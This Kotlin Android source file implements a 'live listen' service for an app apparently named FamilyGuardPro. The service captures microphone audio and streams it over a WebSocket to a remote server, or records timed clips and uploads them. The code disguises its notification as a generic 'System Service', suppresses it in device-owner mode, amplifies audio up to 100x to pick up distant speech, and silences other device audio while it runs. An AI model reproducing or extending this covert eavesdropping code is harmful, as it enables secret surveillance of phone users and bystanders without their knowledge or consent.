package com.familyguardpro.services

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.AudioRecorder
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.io.File
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class LiveListenService : Service() {

    companion object {
        private const val TAG = "LiveListenService"
        private const val NOTIFICATION_ID = 1006
        private const val SAMPLE_RATE = 16000 // 16kHz for smooth streaming (less data)
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val WAKELOCK_TAG = "FamilyGuard:LiveListen"
        
        // AGC (Automatic Gain Control) settings - SMOOTHER for far distance
        private const val TARGET_LEVEL = 20000.0 // Lower target to prevent clipping
        private const val AGC_ATTACK = 0.005 // Slower attack to prevent harsh jumps
        private const val AGC_RELEASE = 0.0002 // Very slow release for stable gain
        private const val MIN_GAIN = 1.0 // Minimum gain
        private const val MAX_GAIN = 100.0 // Maximum gain boost (100x for far distance)
        private const val NOISE_FLOOR = 50 // Very low noise floor
    }
    
    private var currentGain = 20.0 // Start with 20x gain for far distance capture
    private var previousGain = 20.0 // For smooth interpolation

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var audioRecord: AudioRecord? = null
    private var webSocketClient: WebSocketClient? = null
    private var audioRecorder: AudioRecorder? = null
    private var isStreaming = false
    private var isRecording = false
    private var wakeLock: PowerManager.WakeLock? = null
    
    // Audio focus to suppress device audio (like in a call)
    private var audioManager: AudioManager? = null
    private var audioFocusRequest: AudioFocusRequest? = null
    private var previousAudioMode: Int = AudioManager.MODE_NORMAL

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        Log.d(TAG, "onStartCommand called with action: $action")
        
        // CRITICAL: Always call startForeground() first to avoid
        // ForegroundServiceDidNotStartInTimeException
        startForeground()
        
        when (action) {
            "STOP" -> {
                Log.d(TAG, "Stop command received")
                stopLiveStream()
                return START_NOT_STICKY
            }
            else -> {
                when (intent?.getStringExtra("mode")) {
                    "record" -> {
                        val duration = intent.getIntExtra("duration", 60)
                        startRecording(duration)
                    }
                    else -> startLiveStream()
                }
            }
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "LiveListenService onDestroy called")
        
        // Stop streaming first
        isStreaming = false
        isRecording = false
        
        // Release audio focus - restore device audio
        releaseAudioFocus()
        
        // Release audio resources
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing audio", e)
        }
        audioRecord = null
        
        // Close websocket
        try {
            webSocketClient?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing websocket", e)
        }
        webSocketClient = null
        
        // Stop recorder
        try {
            audioRecorder?.stopRecording()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recorder", e)
        }
        audioRecorder = null
        
        // Release wake lock
        releaseWakeLock()
        
        // Cancel all coroutines
        serviceScope.cancel()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }

    private fun startLiveStream() {
        if (isStreaming) return
        isStreaming = true
        
        Log.d(TAG, "Starting live listen stream - MIC ONLY MODE (suppressing device audio)")
        
        // Request exclusive audio focus like a phone call
        // This will pause/duck other audio sources on the device
        requestAudioFocus()
        
        connectWebSocket {
            startAudioCapture()
        }
    }
    
    /**
     * Request audio focus to suppress device audio (reels, music, etc.)
     * Works like a phone call - mic gets priority, device audio is silenced
     */
    @SuppressLint("NewApi")
    private fun requestAudioFocus() {
        try {
            val am = audioManager ?: return
            
            // Save previous audio mode
            previousAudioMode = am.mode
            
            // Set to communication mode (like a call) - this prioritizes mic input
            am.mode = AudioManager.MODE_IN_COMMUNICATION
            
            // Request exclusive audio focus
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val audioAttributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build()
                    
                audioFocusRequest = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    .setAudioAttributes(audioAttributes)
                    .setAcceptsDelayedFocusGain(false)
                    .setWillPauseWhenDucked(false)
                    .setOnAudioFocusChangeListener { focusChange ->
                        Log.d(TAG, "Audio focus changed: $focusChange")
                    }
                    .build()
                    
                am.requestAudioFocus(audioFocusRequest!!)
            } else {
                @Suppress("DEPRECATION")
                am.requestAudioFocus(
                    { focusChange -> Log.d(TAG, "Audio focus changed: $focusChange") },
                    AudioManager.STREAM_VOICE_CALL,
                    AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE
                )
            }
            
            Log.d(TAG, "Audio focus acquired - device audio suppressed")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request audio focus", e)
        }
    }
    
    /**
     * Release audio focus and restore normal audio mode
     */
    @SuppressLint("NewApi")
    private fun releaseAudioFocus() {
        try {
            val am = audioManager ?: return
            
            // Release audio focus
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                audioFocusRequest?.let { am.abandonAudioFocusRequest(it) }
            } else {
                @Suppress("DEPRECATION")
                am.abandonAudioFocus(null)
            }
            
            // Restore previous audio mode
            am.mode = previousAudioMode
            
            Log.d(TAG, "Audio focus released - device audio restored")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release audio focus", e)
        }
    }

    private fun stopLiveStream() {
        if (!isStreaming) return
        isStreaming = false
        
        Log.d(TAG, "Stopping live listen stream")
        
        // Release audio focus first - restore device audio
        releaseAudioFocus()
        
        try {
            audioRecord?.stop()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping audio record", e)
        }
        
        try {
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing audio record", e)
        }
        audioRecord = null
        
        try {
            webSocketClient?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing websocket", e)
        }
        webSocketClient = null
        
        // Stop the service to release mic permission indicator
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun startRecording(duration: Int) {
        if (isRecording) return
        isRecording = true
        
        Log.d(TAG, "Starting audio recording for $duration seconds")
        
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val fileName = "ambient_${timestamp}.mp3"
        val file = File(cacheDir, fileName)
        
        audioRecorder = AudioRecorder(this)
        audioRecorder?.startRecording(file.absolutePath)
        
        // Auto-stop after duration
        serviceScope.launch {
            delay(duration * 1000L)
            stopRecording()
            uploadRecording(file)
            stopSelf()
        }
    }

    private fun stopRecording() {
        if (!isRecording) return
        isRecording = false
        
        audioRecorder?.stopRecording()
        audioRecorder = null
    }

    private fun uploadRecording(file: File) {
        serviceScope.launch {
            try {
                if (!file.exists() || file.length() == 0L) {
                    Log.e(TAG, "Recording file empty or not found")
                    return@launch
                }
                
                val deviceId = preferenceManager.getDeviceId()
                val audioBytes = file.readBytes()
                val audioBase64 = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
                
                ApiClient.api.uploadAudioRecording(
                    deviceId,
                    com.familyguardpro.network.AudioRecordingData(
                        duration = file.length() / 8000,
                        timestamp = System.currentTimeMillis(),
                        data = audioBase64
                    )
                )
                
                Log.d(TAG, "Audio recording uploaded successfully")
                file.delete()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload recording", e)
            }
        }
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_audio"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=audio"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {
                // Handle stop command
                if (message == "stop") {
                    stopLiveStream()
                    stopSelf()
                }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
                if (isStreaming && remote) {
                    // Reconnect if closed by server
                    serviceScope.launch {
                        delay(2000)
                        if (isStreaming) connectWebSocket(onConnected)
                    }
                }
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun startAudioCapture() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Audio permission not granted")
            return
        }
        
        // Use MUCH larger buffer for smooth continuous streaming (8x minimum)
        val minBuffer = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        val bufferSize = minBuffer * 8
        
        // Try VOICE_RECOGNITION first (best for far distance, has hardware AGC)
        // Then CAMCORDER (another sensitive source)
        // Then MIC as fallback
        val audioSources = listOf(
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.CAMCORDER,
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.UNPROCESSED
        )
        
        for (source in audioSources) {
            try {
                audioRecord = AudioRecord(
                    source,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
                )
                
                if (audioRecord?.state == AudioRecord.STATE_INITIALIZED) {
                    Log.d(TAG, "AudioRecord initialized with source: $source, buffer: $bufferSize")
                    break
                } else {
                    audioRecord?.release()
                    audioRecord = null
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to init AudioRecord with source $source", e)
                audioRecord = null
            }
        }
        
        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            Log.e(TAG, "AudioRecord initialization failed with all sources")
            return
        }
        
        audioRecord?.startRecording()
        
        serviceScope.launch(Dispatchers.IO) {
            // Use smaller read chunks for smoother streaming
            val chunkSize = minBuffer / 2
            val buffer = ShortArray(chunkSize)
            
            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    // Apply smooth AGC for far distance capture
                    val amplifiedBuffer = applyAGC(buffer, read)
                    val byteBuffer = shortArrayToByteArray(amplifiedBuffer)
                    sendAudioChunk(byteBuffer)
                }
            }
        }
        
        Log.d(TAG, "Audio capture started - FAR DISTANCE MODE (100x max gain)")
    }
    
    /**
     * Apply smooth Automatic Gain Control (AGC) for far distance audio capture
     * Uses interpolation to prevent choppy/distorted audio
     */
    private fun applyAGC(buffer: ShortArray, length: Int): ShortArray {
        val result = ShortArray(length)
        
        // Find peak level in this buffer
        var peak = 0
        for (i in 0 until length) {
            val absVal = kotlin.math.abs(buffer[i].toInt())
            if (absVal > peak) peak = absVal
        }
        
        // Calculate RMS for average level
        var sumSquares = 0.0
        for (i in 0 until length) {
            sumSquares += buffer[i].toDouble() * buffer[i].toDouble()
        }
        val rms = kotlin.math.sqrt(sumSquares / length)
        
        // Determine target gain based on signal level
        val targetGain: Double
        if (rms < NOISE_FLOOR) {
            // Very quiet (far distance) - use maximum gain
            targetGain = MAX_GAIN
        } else if (peak > 0) {
            // Calculate gain to bring signal to target level
            targetGain = (TARGET_LEVEL / peak.toDouble()).coerceIn(MIN_GAIN, MAX_GAIN)
        } else {
            targetGain = currentGain
        }
        
        // Smooth gain transition (prevents clicks and pops)
        previousGain = currentGain
        if (targetGain < currentGain) {
            // Signal getting louder - reduce gain faster
            currentGain = currentGain * (1 - AGC_ATTACK) + targetGain * AGC_ATTACK
        } else {
            // Signal getting quieter - increase gain slowly
            currentGain = currentGain * (1 - AGC_RELEASE) + targetGain * AGC_RELEASE
        }
        currentGain = currentGain.coerceIn(MIN_GAIN, MAX_GAIN)
        
        // Apply gain with per-sample interpolation for smooth transitions
        for (i in 0 until length) {
            // Interpolate gain across the buffer to prevent sudden jumps
            val progress = i.toDouble() / length
            val interpolatedGain = previousGain + (currentGain - previousGain) * progress
            
            var amplified = (buffer[i] * interpolatedGain).toInt()
            
            // Soft limiting instead of hard clipping (prevents distortion)
            if (amplified > 30000) {
                amplified = 30000 + ((amplified - 30000) / 4)
            } else if (amplified < -30000) {
                amplified = -30000 + ((amplified + 30000) / 4)
            }
            
            // Final clamp
            amplified = amplified.coerceIn(Short.MIN_VALUE.toInt(), Short.MAX_VALUE.toInt())
            result[i] = amplified.toShort()
        }
        
        return result
    }
    
    /**
     * Convert ShortArray to ByteArray (Little Endian for PCM)
     */
    private fun shortArrayToByteArray(shorts: ShortArray): ByteArray {
        val bytes = ByteArray(shorts.size * 2)
        for (i in shorts.indices) {
            bytes[i * 2] = (shorts[i].toInt() and 0xFF).toByte()
            bytes[i * 2 + 1] = (shorts[i].toInt() shr 8 and 0xFF).toByte()
        }
        return bytes
    }

    private fun sendAudioChunk(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            // Send raw PCM data (32kbps equivalent at 16kHz mono 16-bit)
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk", e)
        }
    }
    
    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKELOCK_TAG
            ).apply {
                acquire()
            }
            Log.d(TAG, "Wake lock acquired for live listen")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }
    
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "Wake lock released")
                }
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock", e)
        }
    }
}
